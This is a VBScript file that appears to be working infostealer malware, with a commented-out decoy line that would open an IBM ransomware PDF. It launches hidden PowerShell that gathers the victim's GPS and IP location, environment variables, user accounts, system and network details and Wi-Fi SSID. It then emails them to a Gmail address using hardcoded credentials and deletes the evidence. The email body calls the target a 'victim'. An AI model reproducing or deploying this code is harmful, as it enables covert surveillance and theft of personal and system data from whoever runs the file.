Dim objShell

' Create Shell Object
Set objShell = CreateObject("WScript.Shell")

' Open the IBM ransomware PDF
' objShell.Run "https://www.ibm.com/support/pages/system/files/inline-files/Ransomware%20and%20IBM%20i.pdf"
' Wait for 1 second
' WScript.Sleep 1000

' Extract MAC address, GPS location, IP-based location, system information, and save to a text file
' Run PowerShell command
objShell.Run "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " _
& "Add-Type -AssemblyName System.Device; " _
& "$geo = New-Object System.Device.Location.GeoCoordinateWatcher; " _
& "$geo.Start(); " _
& "Start-Sleep -Seconds 5; " _
& "$latitude = $geo.Position.Location.Latitude; " _
& "$longitude = $geo.Position.Location.Longitude; " _
& "$output = @(); " _
& "$output += '=== GPS Location Data ==='; " _
& "$output += 'Latitude:  ' + $latitude; " _
& "$output += 'Longitude: ' + $longitude; " _
& "$output += 'https://www.google.com/maps/@'+$($latitude)+','+$($longitude); " _
& "$output += ''; " _
& "$output += '=== Fetching IP-Based Location ==='; " _
& "$ipLocation = Invoke-RestMethod -Uri 'https://ipinfo.io/json'; " _
& "$output += 'IP:          ' + $($ipLocation.ip); " _
& "$output += 'City:        ' + $($ipLocation.city); " _
& "$output += 'Region:      ' + $($ipLocation.region); " _
& "$output += 'Country:     ' + $($ipLocation.country); " _
& "$output += 'Location:    ' + $($ipLocation.loc); " _
& "$output += 'Postal Code: ' + $($ipLocation.postal); " _ 
& "$output += ''; " _
& "$output += '=== System Environment ==='; " _
& "$output += (Get-ChildItem Env: | Out-String); " _
& "$output += ''; " _
& "$output += '=== Users ==='; " _
& "$output += (Get-WmiObject Win32_UserAccount | Select-Object Name, Disabled, Lockout, PasswordChangeable, PasswordExpires, PasswordRequired, Status | Out-String); " _
& "$output += ''; " _
& "$output += '=== System Information ==='; " _
& "$output += (Get-ComputerInfo | Select-Object CsName, WindowsVersion, WindowsBuildLabEx, OsArchitecture, OsName, OsManufacturer, CsManufacturer, CsModel, CsSystemType, CsTotalPhysicalMemory, BiosSeralNumber, CsAdminPasswordStatus, CsUserName, TimeZone | Out-String); " _
& "$output += ''; " _
& "$output += (systeminfo | Select-String 'OS Version', 'System Manufacturer', 'Total Physical Memory', 'BIOS Version', 'Windows Directory', 'System Directory', 'Boot Device', 'Locale', 'Domain', 'Logon Server' | Out-String); " _
& "$output += ''; " _
& "$output += '=== MAC Information ==='; " _
& "$output += (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null } | Select-Object Description, MACAddress | Out-String); " _
& "$output += ''; " _
& "$output += '=== MAC Along With IP ==='; " _
& "$output += (ipconfig /all | Out-String); " _
& "$output += ''; " _
& "$output += '=== Gateway IP ==='; " _
& "$output += tracert -h 2 8.8.8.8; " _
& "$output += ''; " _
& "$output += '=== Wi-Fi SSID ==='; " _
& "$ssid = (netsh wlan show interfaces) -match 'SSID' | Where-Object {$_ -notmatch 'BSSID'} -replace '.*SSID\s+:\s+', ''; " _
& "if ($ssid) { $output += 'SSID: ' + $ssid + '' } else { $output += 'Wi-Fi SSID: Not Connected' }; " _
& "$output | Set-Content -Path 'SystemInfo.txt'; " _
& "Start-Sleep -Seconds 2; " _
& "$From = 'qrpay.69991@gmail.com'; " _
& "$To = 'qrpay.69991@gmail.com'; " _
& "$Subject = 'Info Of ' + $($ipLocation.ip); " _
& "$Body = 'Victim Trigger the File'; " _
& "$SMTPServer = 'smtp.gmail.com'; " _
& "$SMTPPort = 587; " _
& "$Username = 'qrpay.69991@gmail.com'; " _
& "$Password = 'proi gcdr dcle kfyc'; " _
& "$Attachment = './SystemInfo.txt'; " _
& "$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;" _
& "$Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecurePassword); " _
& "send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl  -Credential $Credential -Attachments $Attachment; " _
& "Start-Sleep -Seconds 2; " _
& "Remove-Item -Path $Attachment -Force -ErrorAction SilentlyContinue" , 0, False

Set objShell = Nothing

